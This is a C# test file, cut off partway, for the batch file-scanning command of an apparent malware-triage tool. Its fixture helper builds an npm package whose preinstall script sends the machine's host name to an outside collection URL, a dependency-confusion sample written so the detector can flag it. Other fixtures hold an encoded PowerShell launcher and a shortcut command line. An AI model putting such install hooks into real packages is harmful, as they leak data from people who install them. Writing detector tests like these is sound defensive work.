using System.IO.Compression;
using System.Text.Json;
using System.Text.Json.Nodes;
using Corvus.Native.Providers.Worker;
using Corvus.Native.Providers.Worker.Yara;
using Corvus.Setup;
using ModelContextProtocol.Protocol;

namespace Corvus.Tests;

/// <summary>batch --file --json: the fixed read-only steps over one file, written as one corvus.batch/1 document.</summary>
public class FileBatchTests
{
    private static async Task<(int Code, JsonNode? Document, string Out)> Batch(params string[] args)
    {
        var (code, output, _) = await ToolCliTests.Run(["batch", .. args, "--json", "--no-index"]);
        return (code, output.Length > 0 ? JsonNode.Parse(output) : null, output);
    }

    private static JsonNode Section(JsonNode document, string name) => document["sections"]!.AsArray().Single(s => (string?)s!["name"] == name)!;

    [Fact]
    public async Task A_container_over_its_file_limit_is_partial_and_keeps_the_files_read()
    {
        using var dir = new TempDir();
        var zip = Path.Combine(dir.Path, "five.zip");
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
            for (int i = 0; i < 5; i++)
                using (var writer = new StreamWriter(archive.CreateEntry($"d/f{i}.txt").Open())) writer.Write("text");
        var (code, document, _) = await Batch("--file", zip, "--limit", "containerFiles=3");
        Assert.Equal(0, code);
        Assert.Equal("corvus.batch/1", (string?)document!["schema"]);
        Assert.False((bool)document["complete"]!);
        Assert.Equal(3, (int)document["limits"]!["containerFiles"]!);
        Assert.Equal("zip", (string?)document["file"]!["type"]);
        Assert.Equal("complete", (string?)Section(document, "summary")["status"]);
        var container = Section(document, "container");
        Assert.Equal("partial", (string?)container["status"]);
        Assert.Equal("containerFiles", (string?)container["limit"]);
        Assert.Equal(3, container["result"]!["items"]!.AsArray().Count);
        Assert.Equal(5, (int)container["result"]!["total"]!);
        Assert.Equal("not_applicable", (string?)Section(document, "strings")["status"]);
        Assert.Equal("not_applicable", (string?)Section(document, "yara")["status"]);
    }

    [Fact]
    public async Task A_container_longer_than_one_response_page_is_listed_to_its_end_below_the_limit()
    {
        using var dir = new TempDir();
        var zip = Path.Combine(dir.Path, "many.zip");
        // Long member names keep one default response page well under the 300 members.
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
            for (int i = 0; i < 300; i++)
                using (var writer = new StreamWriter(archive.CreateEntry($"dir/sub/file_{i:D4}_with_a_longer_name_for_width.txt").Open())) writer.Write("text");
        var (code, document, _) = await Batch("--file", zip);
        Assert.Equal(0, code);
        var container = Section(document!, "container");
        Assert.Equal("complete", (string?)container["status"]);
        Assert.Null(container["limit"]);
        Assert.Equal(300, container["result"]!["items"]!.AsArray().Count);
        Assert.False((bool)container["result"]!["hasMore"]!);
    }

    [Fact]
    public void A_result_whose_coverage_is_partial_gives_a_partial_section_with_its_reason()
    {
        var result = new CallToolResult
        {
            Content = [new TextContentBlock { Text = "rows" }],
            StructuredContent = JsonSerializer.SerializeToElement(new
            {
                items = new[] { new { path = "a.txt" } },
                hasMore = false,
                coverage = new { status = "partial", reason = "members over the size cap were not read", limitations = new[] { "size-cap" } },
            }),
        };
        var section = ToolCli.Section(new ToolCli.FileBatchStep("container", "search_container", "containerFiles"), result);
        Assert.Equal("partial", (string?)section["status"]);
        Assert.Equal("members over the size cap were not read", (string?)section["reason"]);
        Assert.Null(section["limit"]);
        Assert.Single(section["result"]!["items"]!.AsArray());
    }

    [Fact]
    public async Task A_dotnet_assembly_gets_its_typed_strings_and_no_container_listing()
    {
        using var dir = new TempDir();
        var dll = Path.Combine(dir.Path, "Lib.dll");
        File.WriteAllBytes(dll, Roslyn.Release("Lib", """public static class C { public static string U() => "https://example.com/api/items"; }"""));
        var (code, document, _) = await Batch("--file", dll);
        Assert.Equal(0, code);
        Assert.Equal("not_applicable", (string?)Section(document!, "container")["status"]);
        var strings = Section(document!, "strings");
        Assert.Equal("complete", (string?)strings["status"]);
        Assert.Contains(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == "https://example.com/api/items");
    }

    [Fact]
    public async Task A_zip_holding_an_assembly_gets_its_typed_strings_with_the_member_path()
    {
        using var dir = new TempDir();
        var zip = Path.Combine(dir.Path, "app.zip");
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
        using (var stream = archive.CreateEntry("lib/Lib.dll").Open())
            stream.Write(Roslyn.Release("Lib", """public static class C { public static string U() => "https://example.com/api/items"; }"""));
        var (code, document, _) = await Batch("--file", zip);
        Assert.Equal(0, code);
        var strings = Section(document!, "strings");
        Assert.Equal("complete", (string?)strings["status"]);
        var url = Assert.Single(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == "https://example.com/api/items")!;
        Assert.StartsWith("lib/Lib.dll: ", (string?)url["locations"]![0]);
    }

    [Fact]
    public async Task A_ZIP_that_is_not_a_build_has_a_build_section_that_does_not_apply()
    {
        using var dir = new TempDir();
        var zip = Path.Combine(dir.Path, "notes.zip");
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
        using (var writer = new StreamWriter(archive.CreateEntry("notes.txt").Open())) writer.Write("text");
        var (code, document, _) = await Batch("--file", zip);
        Assert.Equal(0, code);
        var buildSection = Section(document!, "build");
        Assert.Equal("not_applicable", (string?)buildSection["status"]);
        Assert.Contains("not_a_build", (string?)buildSection["reason"]);
        Assert.True((bool)document!["complete"]!);
    }

    [Fact]
    public async Task A_single_file_that_is_not_a_package_is_not_read_as_a_build()
    {
        using var dir = new TempDir();
        var file = Path.Combine(dir.Path, "plain.bin");
        File.WriteAllBytes(file, new byte[64]);
        var (_, document, _) = await Batch("--file", file);
        Assert.Equal("not_applicable", (string?)Section(document!, "build")["status"]);
    }

    [Fact]
    public async Task An_android_package_with_metadata_gets_the_build_summary()
    {
        using var dir = new TempDir();
        var apk = Path.Combine(dir.Path, "app.apk");
        using (var archive = ZipFile.Open(apk, ZipArchiveMode.Create))
            foreach (var (name, bytes) in new (string, byte[])[]
                     {
                         ("lib/arm64-v8a/libil2cpp.so", [0x7F, 0x45, 0x4C, 0x46, 2]),
                         ("lib/arm64-v8a/libunity.so", [0x7F, 0x45, 0x4C, 0x46, 2]),
                         ("assets/bin/Data/Managed/Metadata/global-metadata.dat", BuildSummaryTests.Metadata(27, ["Player"])),
                         ("assets/bin/Data/data.unity3d", [.. "UnityFS\0"u8, 0, 0, 0, 8, .. "5.x.x\0"u8, .. "2021.1.5f1\0"u8, 0, 0, 0, 0]),
                     })
                using (var stream = archive.CreateEntry(name).Open()) stream.Write(bytes);
        var (code, document, _) = await Batch("--file", apk);
        Assert.Equal(0, code);
        var buildSection = Section(document!, "build");
        Assert.Equal("complete", (string?)buildSection["status"]);
        Assert.Equal("aot", (string?)buildSection["result"]!["backend"]!["kind"]);
        Assert.Equal("readable", (string?)buildSection["result"]!["backend"]!["metadataState"]);
        Assert.Equal("2021.1.5f1", (string?)buildSection["result"]!["engine"]!["version"]);
    }

    [Fact]
    public async Task A_run_the_time_limit_ends_still_writes_its_document_and_exits_124()
    {
        using var dir = new TempDir();
        var file = Path.Combine(dir.Path, "plain.bin");
        File.WriteAllBytes(file, new byte[64]);
        var (code, document, _) = await Batch("--file", file, "--time-limit", "0.001");
        Assert.Equal(124, code);
        Assert.False((bool)document!["complete"]!);
        Assert.Equal("timeout", (string?)Section(document, "summary")["status"]);
        Assert.Equal("not_applicable", (string?)Section(document, "yara")["status"]);
    }

    [YaraFact]
    public async Task Given_rules_the_yara_section_lists_the_rules_that_matched()
    {
        using var dir = new TempDir();
        var file = dir.File("notes.txt");
        File.WriteAllText(file, "a fixture note for the batch scan");
        var rules = dir.File("batch.yar");
        File.WriteAllText(rules, """
            rule names_the_fixture { strings: $a = "fixture note" condition: $a }
            rule absent_text { strings: $n = "not in the fixture" condition: $n }
            """);
        using var pool = new WorkerPool(new WorkerPoolOptions
        {
            Enabled = true,
            MemoryLimitBytes = 0,
            Start = WorkerPool.OwnCommand() with { Environment = new Dictionary<string, string?> { [YaraX.LibraryVariable] = YaraTestTools.Library } },
        });
        using var shared = WorkerPool.UseShared(pool);
        var (code, document, _) = await Batch("--file", file, "--rules", rules);
        Assert.Equal(0, code);
        var yara = Section(document!, "yara");
        Assert.Equal("complete", (string?)yara["status"]);
        Assert.Equal("names_the_fixture", Assert.Single(yara["result"]!["items"]!.AsArray())!["name"]!.GetValue<string>());
    }

    [Fact]
    public async Task With_the_worker_host_off_the_yara_section_is_unavailable_and_names_the_variable()
    {
        using var dir = new TempDir();
        var file = dir.File("notes.txt");
        File.WriteAllText(file, "text");
        var rules = dir.File("batch.yar");
        File.WriteAllText(rules, "rule any_text { condition: true }");
        using var pool = new WorkerPool(new WorkerPoolOptions { Enabled = false });
        using var shared = WorkerPool.UseShared(pool);
        var (code, document, _) = await Batch("--file", file, "--rules", rules);
        Assert.Equal(0, code);
        var yara = Section(document!, "yara");
        Assert.Equal("unavailable", (string?)yara["status"]);
        Assert.Contains(WorkerPool.EnableVariable, (string?)yara["reason"]);
    }

    [Fact]
    public async Task A_missing_file_or_bad_limit_is_a_usage_error_with_nothing_on_stdout()
    {
        using var dir = new TempDir();
        var (code, _, output) = await Batch("--file", Path.Combine(dir.Path, "absent.bin"));
        Assert.Equal(2, code);
        Assert.Empty(output);
        (code, _, output) = await Batch("--file", dir.Path, "--limit", "noSuchLimit=3");
        Assert.Equal(2, code);
        Assert.Empty(output);
        (code, _, output) = await Batch("--file", dir.Path, "--rules", Path.Combine(dir.Path, "absent.yar"));
        Assert.Equal(2, code);
        Assert.Empty(output);
    }

    [Fact]
    public async Task A_serialized_asset_file_gets_its_field_strings_in_the_strings_section()
    {
        using var dir = new TempDir();
        var file = Path.Combine(dir.Path, "sharedassets0.assets");
        File.WriteAllBytes(file, AssetFileStringsTests.ConfigFile());
        var (code, document, _) = await Batch("--file", file);
        Assert.Equal(0, code);
        var strings = Section(document!, "strings");
        Assert.Equal("complete", (string?)strings["status"]);
        var items = strings["result"]!["items"]!.AsArray();
        var url = Assert.Single(items, i => (string?)i!["value"] == AssetFileStringsTests.Url)!;
        Assert.Equal("sharedassets0.assets: Endpoints (Script: Net.Config).url", (string?)url["locations"]![0]);
        Assert.Contains(items, i => (string?)i!["type"] == "encoded" && (string?)i["detail"] == "base64, 32 bytes");
        Assert.Equal(1 << 30, (double)document!["limits"]!["assetBytes"]!);
    }

    [Fact]
    public async Task A_build_folder_gets_its_asset_strings_and_a_folder_without_one_does_not_apply()
    {
        using var dir = new TempDir();
        var data = Directory.CreateDirectory(Path.Combine(dir.Path, "App", "App_Data")).FullName;
        File.WriteAllBytes(Path.Combine(data, "level0"), AssetFileStringsTests.ConfigFile());
        var (_, document, _) = await Batch("--file", Path.Combine(dir.Path, "App"));
        var strings = Section(document!, "strings");
        Assert.Equal("complete", (string?)strings["status"]);
        Assert.Contains(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == AssetFileStringsTests.Url);
        var plain = Directory.CreateDirectory(Path.Combine(dir.Path, "plain")).FullName;
        File.WriteAllText(Path.Combine(plain, "notes.txt"), "text");
        (_, document, _) = await Batch("--file", plain);
        strings = Section(document!, "strings");
        Assert.Equal("not_applicable", (string?)strings["status"]);
        Assert.Contains("not_a_build", (string?)strings["reason"]);
    }

    [Fact]
    public async Task An_asset_layout_that_did_not_read_makes_the_strings_section_partial_with_its_reason()
    {
        using var dir = new TempDir();
        var file = Path.Combine(dir.Path, "level0");
        File.WriteAllBytes(file, AssetFileStringsTests.ConfigFile(typeTrees: false));
        var (_, document, _) = await Batch("--file", file);
        var strings = Section(document!, "strings");
        Assert.Equal("partial", (string?)strings["status"]);
        Assert.Contains("partial or unknown", (string?)strings["reason"]);
        Assert.False((bool)document!["complete"]!);
    }

    [Fact]
    public async Task An_asset_byte_limit_makes_the_strings_section_partial_and_keeps_the_rows_read()
    {
        using var dir = new TempDir();
        var data = Directory.CreateDirectory(Path.Combine(dir.Path, "App", "App_Data")).FullName;
        var first = AssetFileStringsTests.ConfigFile();
        File.WriteAllBytes(Path.Combine(data, "level0"), first);
        File.WriteAllBytes(Path.Combine(data, "level1"), AssetFileStringsTests.ConfigFile());
        var (_, document, _) = await Batch("--file", Path.Combine(dir.Path, "App"), "--limit", $"assetBytes={first.Length}");
        var strings = Section(document!, "strings");
        Assert.Equal("partial", (string?)strings["status"]);
        Assert.Contains("level1 and 0 later files are not", (string?)strings["reason"]);
        Assert.Contains(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == AssetFileStringsTests.Url);
    }

    /// <summary>Writes an npm package whose install script sends the host name to a collection URL.</summary>
    internal static string Package(string path)
    {
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        using (var gz = new GZipStream(File.Create(path), CompressionLevel.Fastest))
        using (var tar = new System.Formats.Tar.TarWriter(gz, System.Formats.Tar.TarEntryFormat.Ustar))
            foreach (var (name, text) in new[]
                     {
                         ("package/package.json", """{"name":"internal-auth-utils","version":"99.0.0","scripts":{"preinstall":"node index.js"}}"""),
                         ("package/index.js", "const os=require('os'),https=require('https');\nhttps.get('https://x1.oastify.com/?h='+os.hostname());"),
                     })
                tar.WriteEntry(new System.Formats.Tar.UstarTarEntry(System.Formats.Tar.TarEntryType.RegularFile, name) { DataStream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(text)) });
        return path;
    }

    [Fact]
    public async Task The_summary_names_the_file_level_and_the_findings_that_set_it()
    {
        using var dir = new TempDir();
        var package = Package(Path.Combine(dir.Path, "internal-auth-1.0.0.tgz"));
        var (_, document, _) = await Batch("--file", package);
        var summary = document!["summary"]!;
        Assert.Equal("noteworthy", (string?)summary["level"]);
        var reasons = summary["reasons"]!.AsArray();
        Assert.Contains(reasons, r => (string?)r!["rule"] == "package/collection-url" && (string?)r["source"] == "package");
        Assert.All(reasons, r => Assert.Equal("noteworthy", (string?)r!["level"]));

        var plain = Path.Combine(dir.Path, "notes.txt");
        File.WriteAllText(plain, "plain text");
        var (_, other, _) = await Batch("--file", plain);
        Assert.Equal("none", (string?)other!["summary"]!["level"]);
        Assert.Empty(other["summary"]!["reasons"]!.AsArray());
    }

    [Fact]
    public async Task The_document_names_the_rule_table_digest_and_each_installed_rule_pack_with_its_version_and_digest()
    {
        using var dir = new TempDir();
        var plain = Path.Combine(dir.Path, "notes.txt");
        File.WriteAllText(plain, "plain text");
        var (_, document, _) = await Batch("--file", plain);
        Assert.Equal(Corvus.Services.Analysis.FindingRules.Digest, (string?)document!["ruleTable"]);
        var installed = Corvus.Core.RulePacks.Installed(Corvus.Core.RulePacks.Root).Select(p => $"{p.Name} {p.Version} {p.Digest ?? "unknown"}");
        Assert.Equal(installed, document["rulePacks"]!.AsArray().Select(p => $"{(string?)p!["name"]} {(string?)p["version"]} {(string?)p["digest"]}"));
    }

    [Fact]
    public async Task A_folder_gives_one_record_per_sha256_with_every_path_and_the_noteworthy_record_first()
    {
        using var dir = new TempDir();
        File.WriteAllText(Path.Combine(dir.Path, "a.txt"), "plain text");
        var package = Package(Path.Combine(dir.Path, "sub", "pkg.tgz"));
        Directory.CreateDirectory(Path.Combine(dir.Path, "sub", "deep"));
        File.Copy(package, Path.Combine(dir.Path, "sub", "deep", "pkg-copy.tgz"));
        var (code, document, _) = await Batch("--file", dir.Path, "--recurse");
        Assert.Equal(0, code);
        Assert.Equal("noteworthy", (string?)document!["summary"]!["level"]);
        Assert.Equal(3, (int)document["summary"]!["files"]!);
        var records = document["records"]!.AsArray();
        // The package's own members are records too.
        Assert.Contains(records, r => (string?)r!["file"]!["paths"]![0] == "sub/deep/pkg-copy.tgz!/package/package.json");
        var first = records[0]!;
        Assert.Equal(["sub/deep/pkg-copy.tgz", "sub/pkg.tgz"], first["file"]!["paths"]!.AsArray().Select(p => (string?)p));
        Assert.Equal("noteworthy", (string?)first["summary"]!["level"]);
        Assert.True((int)first["counts"]!["noteworthy"]! > 0);
        var sha = (string)first["file"]!["sha256"]!;
        Assert.Equal(Convert.ToHexStringLower(System.Security.Cryptography.SHA256.HashData(File.ReadAllBytes(package))), sha);
        Assert.All(first["findings"]!.AsArray(), f => Assert.StartsWith(sha + "|" + (string?)f!["rule"] + "|", (string?)f["key"]));
        var plain = Assert.Single(records, r => (string?)r!["file"]!["paths"]![0] == "a.txt")!;
        Assert.Equal("none", (string?)plain["summary"]!["level"]);
        Assert.Null(document["sections"]);
    }

    [Fact]
    public async Task A_file_and_its_copy_inside_a_zip_share_one_record_with_both_paths()
    {
        using var dir = new TempDir();
        File.WriteAllText(Path.Combine(dir.Path, "a.txt"), "shared text");
        using (var archive = ZipFile.Open(Path.Combine(dir.Path, "b.zip"), ZipArchiveMode.Create))
            foreach (var (name, text) in new[] { ("docs/a.txt", "shared text"), ("docs/c.bat", "@echo off\r\necho second member\r\n") })
                using (var writer = new StreamWriter(archive.CreateEntry(name).Open())) writer.Write(text);
        var (code, document, _) = await Batch("--file", dir.Path, "--recurse");
        Assert.Equal(0, code);
        var records = document!["records"]!.AsArray();
        var paths = records.Select(r => string.Join(" ", r!["file"]!["paths"]!.AsArray().Select(p => (string?)p))).ToList();
        // The member keeps its archive name, not its extracted .bin name.
        Assert.Equal(["a.txt b.zip!/docs/a.txt", "b.zip", "b.zip!/docs/c.bat"], paths);
        Assert.Equal(2, (int)document["summary"]!["members"]!);
        var zip = records[1]!;
        Assert.Equal("complete", (string?)zip["sections"]!.AsArray().Single(s => (string?)s!["name"] == "members")!["status"]);
        Assert.True((bool)document["complete"]!);
    }

    [Fact]
    public async Task A_member_past_the_nesting_limit_is_named_as_not_read()
    {
        using var dir = new TempDir();
        // Six zips, each holding the next; the unpack walk opens four levels.
        byte[] bytes = System.Text.Encoding.UTF8.GetBytes("innermost text");
        string name = "x.txt";
        for (int level = 0; level < 6; level++)
        {
            var stream = new MemoryStream();
            using (var archive = new ZipArchive(stream, ZipArchiveMode.Create, leaveOpen: true))
            using (var entry = archive.CreateEntry(name).Open()) entry.Write(bytes);
            (bytes, name) = (stream.ToArray(), $"level{level}.zip");
        }
        File.WriteAllBytes(Path.Combine(dir.Path, "deep.zip"), bytes);
        var (_, document, _) = await Batch("--file", dir.Path, "--recurse", "--fail-on", "noteworthy");
        var deep = document!["records"]!.AsArray().Single(r => (string?)r!["file"]!["paths"]![0] == "deep.zip")!;
        Assert.False((bool)deep["complete"]!);
        Assert.Contains(deep["unread"]!.AsArray(), u => ((string)u!).Contains("nesting limit", StringComparison.Ordinal));
        Assert.Contains(document["gate"]!["reasons"]!.AsArray(), r => ((string)r!).StartsWith("deep.zip: ", StringComparison.Ordinal) && ((string)r!).Contains("nesting limit", StringComparison.Ordinal));
    }

    [Fact]
    public async Task The_report_of_a_zip_lists_its_three_records_in_level_order_with_names_escaped()
    {
        using var dir = new TempDir();
        var zip = Path.Combine(dir.Path, "in.zip");
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
            foreach (var (name, bytes) in new (string, byte[])[]
                     {
                         ("# notes [x](y).txt", System.Text.Encoding.UTF8.GetBytes("plain text")),
                         ("run.lnk", ShellLinkTests.Shortcut("/c start invoice.pdf")),
                     })
                using (var stream = archive.CreateEntry(name).Open()) stream.Write(bytes);
        var report = Path.Combine(dir.Path, "report.md");
        var (code, document, _) = await Batch("--file", zip, "--recurse", "--report", report);
        Assert.Equal(0, code);
        var records = document!["records"]!.AsArray();
        Assert.Equal(3, records.Count);
        var text = File.ReadAllText(report);
        var headings = text.Split('\n').Where(l => l.StartsWith("## ", StringComparison.Ordinal)).ToList();
        Assert.Equal(3, headings.Count);
        Assert.Contains("run\\.lnk", headings[0]);
        Assert.StartsWith("## 1. review: ", headings[0]);
        Assert.Contains("\\# notes \\[x\\]\\(y\\)\\.txt", headings[2]);
        var ranks = records.Select(r => Corvus.Services.Analysis.FindingLevel.Rank((string?)r!["summary"]!["level"])).ToList();
        Assert.Equal(ranks.OrderByDescending(r => r), ranks);
    }

    [Fact]
    public async Task A_report_path_in_a_refused_place_is_a_usage_error()
    {
        using var dir = new TempDir();
        var plain = dir.File("notes.txt");
        File.WriteAllText(plain, "text");
        var (code, _, output) = await Batch("--file", plain, "--report", dir.File("AGENTS.md"));
        Assert.Equal(2, code);
        Assert.Empty(output);
    }

    [Fact]
    public void Markdown_escaping_keeps_read_text_on_one_inert_line()
    {
        var escaped = Corvus.Core.Format.EscapeMarkdown("# title\n- [link](http://x) `code` <b>\u202e");
        Assert.DoesNotContain('\n', escaped);
        Assert.StartsWith("\\# title", escaped);
        Assert.Contains("\\[link\\]\\(http\\:\\/\\/x\\)", escaped);
        Assert.Contains("\\`code\\` \\<b\\>", escaped);
        Assert.EndsWith("\\\\u202e", escaped);
    }

    [Fact]
    public async Task Jsonl_writes_one_record_per_line_for_every_file_and_member()
    {
        using var dir = new TempDir();
        var input = Directory.CreateDirectory(Path.Combine(dir.Path, "in")).FullName;
        File.WriteAllText(Path.Combine(input, "a.txt"), "first file");
        File.WriteAllText(Path.Combine(input, "b.txt"), "second file");
        using (var archive = ZipFile.Open(Path.Combine(input, "c.zip"), ZipArchiveMode.Create))
            foreach (var (name, text) in new[] { ("d.txt", "first member"), ("e.txt", "second member") })
                using (var writer = new StreamWriter(archive.CreateEntry(name).Open())) writer.Write(text);
        var (code, output, _) = await ToolCliTests.Run("batch", "--file", input, "--recurse", "--jsonl", "--no-index");
        Assert.Equal(0, code);
        var lines = output.Split('\n', StringSplitOptions.RemoveEmptyEntries);
        // Three files, one of them a zip with two members.
        Assert.Equal(5, lines.Length);
        Assert.All(lines, l => Assert.NotNull(JsonNode.Parse(l)!["file"]!["sha256"]));
        Assert.All(lines, l => Assert.Null(JsonNode.Parse(l)!["schema"]));

        var target = Path.Combine(dir.Path, "records.jsonl");
        (code, output, _) = await ToolCliTests.Run("batch", "--file", input, "--recurse", "--jsonl", "--out", target, "--no-index");
        Assert.Equal(0, code);
        Assert.Empty(output);
        Assert.Equal(5, File.ReadAllLines(target).Length);
    }

    [Fact]
    public async Task Out_without_jsonl_and_json_with_jsonl_are_usage_errors()
    {
        using var dir = new TempDir();
        var plain = dir.File("notes.txt");
        File.WriteAllText(plain, "text");
        var (code, output, _) = await ToolCliTests.Run("batch", "--file", plain, "--json", "--out", dir.File("r.jsonl"));
        Assert.Equal(2, code);
        Assert.Empty(output);
        (code, output, _) = await ToolCliTests.Run("batch", "--file", plain, "--json", "--jsonl");
        Assert.Equal(2, code);
        Assert.Empty(output);
    }

    [Fact]
    public async Task Files_past_the_members_limit_are_named_and_leave_the_run_incomplete()
    {
        using var dir = new TempDir();
        for (int i = 0; i < 3; i++) File.WriteAllText(Path.Combine(dir.Path, $"f{i}.txt"), $"text {i}");
        var (code, document, _) = await Batch("--file", dir.Path, "--recurse", "--limit", "members=2");
        Assert.Equal(0, code);
        Assert.Equal(2, document!["records"]!.AsArray().Count);
        Assert.False((bool)document["complete"]!);
        Assert.StartsWith("Files past the members limit of 2: 1, from ", (string?)document["unread"]![0]);
    }

    [Fact]
    public async Task A_noteworthy_package_fails_the_gate_with_exit_1_and_a_plain_file_passes()
    {
        using var dir = new TempDir();
        var package = Package(Path.Combine(dir.Path, "pkg.tgz"));
        var (code, document, _) = await Batch("--file", package, "--fail-on", "noteworthy");
        Assert.Equal(1, code);
        var gate = document!["gate"]!;
        Assert.True((bool)gate["failed"]!);
        Assert.Contains(gate["reasons"]!.AsArray(), r => ((string)r!).Contains("noteworthy finding package/collection-url, key ", StringComparison.Ordinal));
        var plain = dir.File("notes.txt");
        File.WriteAllText(plain, "plain text");
        (code, document, _) = await Batch("--file", plain, "--fail-on", "review");
        Assert.Equal(0, code);
        Assert.False((bool)document!["gate"]!["failed"]!);
    }

    [Fact]
    public async Task A_run_the_time_limit_ends_fails_the_gate_unless_incomplete_records_are_allowed()
    {
        using var dir = new TempDir();
        File.WriteAllBytes(dir.File("plain.bin"), new byte[64]);
        var (code, document, _) = await Batch("--file", dir.Path, "--recurse", "--time-limit", "0.001", "--fail-on", "noteworthy");
        Assert.Equal(1, code);
        Assert.Contains("plain.bin: summary timeout", document!["gate"]!["reasons"]!.AsArray().Select(r => (string?)r));
        (code, document, _) = await Batch("--file", dir.Path, "--recurse", "--time-limit", "0.001", "--fail-on", "noteworthy", "--allow-incomplete");
        Assert.Equal(0, code);
        Assert.Empty(document!["gate"]!["reasons"]!.AsArray());
    }

    [Fact]
    public void Two_findings_of_one_rule_in_one_file_each_fail_the_gate()
    {
        var finding = (string evidence) => new JsonObject
        {
            ["level"] = "review", ["rule"] = "script/download", ["evidence"] = evidence, ["location"] = null,
            ["key"] = ToolCli.FindingKey("ab", "script/download", "review", evidence, null),
        };
        var document = new JsonObject
        {
            ["file"] = new JsonObject { ["path"] = "run.ps1" },
            ["findings"] = new JsonArray(finding("https://example.com/a"), finding("https://example.com/b")),
            ["sections"] = new JsonArray(),
        };
        var failures = ToolCli.GateFailures(document, "review", allowIncomplete: false);
        Assert.Equal(2, failures.Count);
        Assert.NotEqual(failures[0], failures[1]);
        Assert.Empty(ToolCli.GateFailures(document, "noteworthy", allowIncomplete: false));
    }

    [Fact]
    public async Task A_bad_fail_on_level_is_a_usage_error()
    {
        using var dir = new TempDir();
        var (code, _, output) = await Batch("--file", dir.Path, "--fail-on", "info");
        Assert.Equal(2, code);
        Assert.Empty(output);
        (code, _, output) = await Batch("--file", dir.Path, "--allow-incomplete");
        Assert.Equal(2, code);
        Assert.Empty(output);
    }

    [Fact]
    public async Task Extract_writes_a_peeled_script_and_a_decoded_literal_with_their_chains()
    {
        using var dir = new TempDir();
        var input = Directory.CreateDirectory(Path.Combine(dir.Path, "in")).FullName;
        var encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("Write-Host 'extract marker'"));
        File.WriteAllText(Path.Combine(input, "run.bat"), $"@echo off\r\npowershell.exe -NoP -Enc {encoded}\r\n");
        var compressed = new MemoryStream();
        using (var gz = new GZipStream(compressed, CompressionLevel.Fastest, leaveOpen: true))
            gz.Write(System.Text.Encoding.UTF8.GetBytes(string.Concat(Enumerable.Repeat("decoded literal text for the extract step. ", 4))));
        var literal = Convert.ToBase64String(compressed.ToArray());
        File.WriteAllBytes(Path.Combine(input, "Lib.dll"), Roslyn.Release("Lib", $$"""public static class C { public static string P() => "{{literal}}"; }"""));
        var output = Path.Combine(dir.Path, "out");
        var (code, document, _) = await Batch("--file", input, "--recurse", "--extract", output);
        Assert.Equal(0, code);
        var extracted = document!["records"]!.AsArray().SelectMany(r => r!["extracted"]!.AsArray()).ToList();
        var script = Assert.Single(extracted, e => (string?)e!["kind"] == "script")!;
        Assert.Contains("extract marker", File.ReadAllText(Path.Combine(output, (string)script["path"]!)));
        Assert.Contains(script["chain"]!.AsArray(), c => ((string)c!).StartsWith("powershell via ", StringComparison.Ordinal));
        var embedded = Assert.Single(extracted, e => e!["chain"]!.AsArray().Select(c => (string?)c).SequenceEqual(["base64", "gzip"]))!;
        Assert.Contains("decoded literal text", File.ReadAllText(Path.Combine(output, (string)embedded["path"]!)));
        var index = JsonNode.Parse(File.ReadAllText(Path.Combine(output, "index.json")))!.AsArray();
        Assert.Equal(2, index.Count);
        Assert.Contains(index, e => (string?)e!["paths"]![0] == "run.bat" && e["extracted"]!.AsArray().Count == 1);
    }

    [Fact]
    public async Task Extract_refuses_a_folder_that_is_not_empty()
    {
        using var dir = new TempDir();
        File.WriteAllText(dir.File("notes.txt"), "text");
        var (code, _, output) = await Batch("--file", dir.File("notes.txt"), "--extract", dir.Path);
        Assert.Equal(2, code);
        Assert.Empty(output);
    }

    private static string WriteBaseline(TempDir dir, IEnumerable<(string Key, string Expires)> entries) =>
        WriteText(dir.File("baseline.json"), new JsonObject
        {
            ["schema"] = "corvus.baseline/1",
            ["entries"] = new JsonArray([.. entries.Select(e => (JsonNode?)new JsonObject { ["key"] = e.Key, ["reason"] = "reviewed", ["owner"] = "release", ["expires"] = e.Expires })]),
        }.ToJsonString());

    private static string WriteText(string path, string text)
    {
        File.WriteAllText(path, text);
        return path;
    }

    [Fact]
    public async Task A_baseline_entry_suppresses_its_exact_finding_and_the_gate_passes()
    {
        using var dir = new TempDir();
        var package = Package(Path.Combine(dir.Path, "pkg.tgz"));
        var (_, first, _) = await Batch("--file", package);
        var keys = first!["findings"]!.AsArray().Select(f => (string)f!["key"]!).ToList();
        Assert.NotEmpty(keys);
        var baseline = WriteBaseline(dir, keys.Skip(1).Select(k => (k, "2999-12-31")));
        var (code, document, _) = await Batch("--file", package, "--baseline", baseline, "--fail-on", "noteworthy");
        Assert.Equal(1, code);
        Assert.Equal(keys.Skip(1), document!["suppressed"]!.AsArray().Select(f => (string?)f!["key"]));
        Assert.Equal("reviewed", (string?)document["suppressed"]![0]!["baseline"]!["reason"]);
        Assert.Equal([keys[0]], document["findings"]!.AsArray().Select(f => (string?)f!["key"]));
        Assert.Equal(keys.Count - 1, (int)document["baseline"]!["suppressed"]!);

        baseline = WriteBaseline(dir, keys.Select(k => (k, "2999-12-31")));
        (code, document, _) = await Batch("--file", package, "--baseline", baseline, "--fail-on", "review");
        Assert.Equal(0, code);
        Assert.Equal("none", (string?)document!["summary"]!["level"]);
    }

    [Fact]
    public async Task A_baseline_entry_at_a_lower_level_does_not_suppress_a_level_rise()
    {
        using var dir = new TempDir();
        var package = Package(Path.Combine(dir.Path, "pkg.tgz"));
        var (_, first, _) = await Batch("--file", package);
        var sha = (string)first!["file"]!["sha256"]!;
        var noteworthy = first["findings"]!.AsArray().First(f => (string?)f!["level"] == "noteworthy")!;
        var lower = ToolCli.FindingKey(sha, (string?)noteworthy["rule"], "review", (string?)noteworthy["evidence"], (string?)noteworthy["location"]);
        var baseline = WriteBaseline(dir, [(lower, "2999-12-31")]);
        var (code, document, _) = await Batch("--file", package, "--baseline", baseline, "--fail-on", "noteworthy");
        Assert.Equal(1, code);
        var kept = Assert.Single(document!["findings"]!.AsArray(), f => (string?)f!["key"] == (string?)noteworthy["key"])!;
